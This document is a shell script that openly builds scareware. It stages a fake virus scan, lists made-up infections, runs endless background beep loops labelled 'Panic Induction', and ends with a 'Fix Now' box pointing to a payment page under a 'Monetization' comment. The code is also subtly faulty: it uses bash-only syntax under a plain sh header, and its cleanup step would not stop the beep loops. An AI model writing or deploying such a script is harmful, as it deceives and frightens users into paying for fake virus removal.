#!/bin/sh

# Scareware Title Screen
clear
echo "WARNING: SYSTEM VULNERABILITY DETECTED!"
sleep 2
clear

# Fake Scanning
echo "Scanning your system for viruses and malware..."
sleep 3
clear
echo "Initializing full system scan..."
sleep 5
clear

# Flashing Warnings and Alert Sounds
alert() {
    echo -e "\007" # Beep sound
}

while true; do
    alert
done &

# Fake Scanning GUI with Progress Bar (Simulated using ASCII characters)
for i in {1..10}; do
    echo "Scanning $i% of your system..."
    sleep 2
done

sleep 5
clear

echo "90% of the scan has completed."
sleep 3
clear

echo "Scanning complete! Detected multiple high-risk viruses and malware!"
sleep 4
clear

# False Positives: Randomly Generated Virus List
viruses=("Virus_A" "Virus_B" "Virus_C" "Virus_D")
for virus in "${viruses[@]}"; do
    echo "$virus is detected as a high-risk virus. It was found in the system folder."
done

# Panic Induction: Flashing Warnings and Alert Sounds
while true; do
    alert
    sleep 2
done &

sleep 5
clear

echo "To protect your data, you need to clean up these detected threats immediately!"
sleep 3
clear

# Monetization: Fix Now Button Redirects to Payment Page
echo "
+---------------------------------------------+
|                   WARNING                  |
+---------------------------------------------+
| The following viruses were detected on your system:
| Virus_A, Virus_B, Virus_C, Virus_D          |
|                                             |
| To remove them and protect yourself from future infections, 
| click the 'Fix Now' button.                  |
+---------------------------------------------+

[Fix Now] 

(Open browser and navigate to http://example.com/fake-license)
"

# Cleanup (Simulated by removing the alert processes)
pkill -f "alert"
